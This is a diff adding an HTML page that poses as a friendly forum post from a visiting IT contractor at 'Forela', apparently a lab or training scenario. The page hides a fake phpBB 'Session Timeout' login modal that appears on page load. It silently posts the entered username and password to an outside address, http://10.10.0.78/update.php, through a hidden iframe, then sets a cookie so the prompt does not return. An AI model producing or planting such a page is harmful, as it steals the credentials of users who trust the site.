@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Forum Login</title>
+    
+    <style>
+        body {
+            z-index: 100;
+        }
+
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 100%;
+            z-index: 101;
+            background-color: white;
+            opacity: 1;
+            overflow-y: auto; /* 내용이 길 경우 스크롤 추가 */
+        }
+
+        .modal.hidden {
+            visibility: hidden;
+        }
+
+        /* 포럼 디자인을 위한 기본 CSS 추가 */
+        .wrap {
+            max-width: 900px;
+            margin: 20px auto;
+            font-family: Arial, sans-serif;
+            border: 1px solid #ccc;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .headerbar, .navbar, .page-body, .page-footer {
+            padding: 10px;
+        }
+        .panel {
+            border: 1px solid #ddd;
+            background-color: #f9f9f9;
+            margin-bottom: 15px;
+            padding: 15px;
+        }
+    </style>
+
+    <script type="text/javascript">
+        // 로그인 버튼 클릭 시 실행: 쿠키 설정 및 팝업 숨김
+        function sethidden() {
+            const d = new Date();
+            d.setTime(d.getTime() + (24 * 60 * 60 * 1000)); // 24시간 만료
+            let expires = "expires=" + d.toUTCString();
+            document.cookie = "phpbb_token=1;" + expires + ";path=/";
+            
+            var modal = document.getElementById('zbzbz1234');
+            modal.classList.add("hidden");
+        }
+
+        // 페이지 로딩 완료 시 실행: 쿠키 확인 후 팝업 표시 여부 결정
+        document.addEventListener("DOMContentLoaded", function(event) {
+            let cookieexists = false;
+            let name = "phpbb_token=";
+            let cookies = decodeURIComponent(document.cookie);
+            let ca = cookies.split(';');
+            
+            for (let i = 0; i < ca.length; i++) {
+                let c = ca[i].trim();
+                if (c.indexOf(name) == 0) {
+                    cookieexists = true;
+                    break;
+                }
+            }
+
+            if (cookieexists) {
+                return; // 쿠키가 있으면 아무것도 안 함
+            }
+
+            // 쿠키가 없으면 팝업을 표시
+            var modal = document.getElementById('zbzbz1234');
+            modal.classList.remove("hidden");
+        });
+    </script>
+</head>
+<body>
+
+    <div class="modal hidden" id="zbzbz1234">
+        <div id="wrap" class="wrap">
+            <div id="page-header">
+                <div class="headerbar" role="banner">
+                    <h1>forum.forela.co.uk</h1>
+                    <p>Forela internal forum</p>
+                </div>
+                <div class="navbar" role="navigation">
+                    </div>
+            </div>
+            
+            <div id="page-body" class="page-body" role="main">
+                <div class="panel">
+                    <div class="inner">
+                        <div class="content">
+                            <h3>Session Timeout</h3>
+                            <p>Your session token has timed out. In order to proceed, you must login again.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <form action="http://10.10.0.78/update.php" method="post" id="login" target="hiddenframe">
+                    <div class="panel">
+                        <div class="inner">
+                            <div class="content">
+                                <h2 class="login-title">Login</h2>
+                                <fieldset class="fields1">
+                                    <dl>
+                                        <dt><label for="username">Username:</label></dt>
+                                        <dd><input type="text" tabindex="1" name="username" id="username" size="25" class="inputbox autowidth"></dd>
+                                    </dl>
+                                    <dl>
+                                        <dt><label for="password">Password:</label></dt>
+                                        <dd><input type="password" tabindex="2" id="password" name="password" size="25" class="inputbox autowidth" autocomplete="off"></dd>
+                                    </dl>
+                                    <dl>
+                                        <dd>
+                                            <input type="submit" name="login" tabindex="6" value="Login" class="button1" onclick="sethidden()">
+                                        </dd>
+                                    </dl>
+                                </fieldset>
+                            </div>
+                        </div>
+                    </div>
+                </form>
+            </div>
+            
+            <div id="page-footer" class="page-footer" role="contentinfo">
+                <div class="copyright">
+                    <p class="footer-row">Powered by phpBB® Forum Software © phpBB Limited</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <iframe name="hiddenframe" id="hiddenframe" style="display:none;"></iframe>
+    
+    <div>
+        <span>
+            Greetings everyone,<br> <br>
+            I am just a visiting IT Contractor, it's a fantastic company y'all have here.<br>
+            I hope to work with you all again soon.<br> <br>
+            Regards,<br>
+            Alex Poole
+        </span>
+    </div>
+
+</body>
+</html>
